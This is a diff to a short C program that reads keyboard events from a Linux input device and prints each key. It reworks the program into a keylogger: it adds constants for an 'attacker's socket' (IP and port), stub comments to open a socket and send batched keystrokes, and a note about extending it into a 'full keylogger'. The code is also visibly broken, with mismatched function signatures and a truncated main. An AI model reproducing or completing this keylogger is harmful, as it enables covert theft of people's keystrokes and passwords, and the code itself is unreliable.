@@ -14,12 +14,21 @@ https://www.kernel.org/doc/html/v5.4/input/event-codes.html
 
 must flush stream to avoid buffering, use fflush()
 
+(TCP)
+
 */
 
 #include <stdio.h>
 #include <fcntl.h>
 #include <unistd.h>
 #include <linux/input.h>
+
+// attacker's socket
+#define IP "127.0.0.0"
+#define PORT 8080
+
+
+void print(int fd);
 
 int main(int argc, char *argv[]) {
     if (argc != 2) {
@@ -36,6 +45,13 @@ int main(int argc, char *argv[]) {
         return 1;
     }
 
+    // open socket
+
+    // batch and print
+
+}
+
+void print(int fd, input_event ie) {
     for (;;) {
         read(fd, &ie, sizeof(ie));
         if (ie.type != EV_KEY)
@@ -67,6 +83,7 @@ int main(int argc, char *argv[]) {
                     printf("(backspace)"); break;
                 case KEY_CAPSLOCK:
                     printf("(capslock)"); break;
+                // add more case statements for full keylogger
                 default:
                     printf("Unknown key: %d\n", ie.code);
             }
